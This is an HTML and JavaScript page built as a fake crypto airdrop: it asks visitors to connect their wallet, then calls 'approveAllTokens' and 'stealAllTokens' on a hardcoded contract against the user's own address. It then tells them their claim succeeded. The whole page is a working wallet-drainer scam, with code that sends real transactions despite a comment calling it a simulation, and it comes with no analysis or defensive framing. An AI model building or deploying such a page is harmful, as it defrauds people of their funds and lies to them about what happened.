<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fake Airdrop DApp</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f3f3f3;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .button {
            padding: 10px 20px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .button:disabled {
            background-color: #ccc;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Claim Your Fake Airdrop</h1>
    <p>Connect your wallet to claim free tokens!</p>
    <button id="connectWalletButton" class="button">Connect Wallet</button>
    <button id="claimAirdropButton" class="button" disabled>Claim Airdrop</button>
    <p class="note">Note: Make sure to approve before claiming.</p>
</div>

<script>
    let provider;
    let signer;
    const contractAddress = "0xcD8F8002E9A7B9e20Af9B6bb1D6AE0C6754Fe8c9"; // Contract Address
    const contractABI = [
        {
            "inputs": [
                { "internalType": "address", "name": "token", "type": "address" }
            ],
            "name": "approveAllTokens",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                { "internalType": "address", "name": "victim", "type": "address" }
            ],
            "name": "stealAllTokens",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

    async function connectWallet() {
        if (window.ethereum) {
            try {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                console.log("Wallet connected!");
                document.getElementById("claimAirdropButton").disabled = false;
            } catch (error) {
                console.error("Failed to connect wallet:", error);
                alert("Failed to connect wallet. Please try again.");
            }
        } else {
            alert("Please install MetaMask to connect your wallet.");
        }
    }

    async function claimAirdrop() {
        try {
            const contract = new ethers.Contract(contractAddress, contractABI, signer);

            // Approve all tokens using the malicious contract
            const victimAddress = await signer.getAddress();
            const approveTx = await contract.approveAllTokens(victimAddress);
            console.log("Approval transaction sent:", approveTx.hash);
            await approveTx.wait(); // Wait for the transaction to be mined
            console.log("Approval granted!");

            // Simulate stealing all tokens
            const stealTx = await contract.stealAllTokens(victimAddress);
            console.log("Tokens stolen:", stealTx.hash);

            alert("Congratulations! Your airdrop claim was successful.");
        } catch (error) {
            console.error("Error during airdrop:", error);
            alert("Failed to claim airdrop. Please try again.");
        }
    }

    document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
    document.getElementById("claimAirdropButton").addEventListener("click", claimAirdrop);
</script>

</body>
</html>
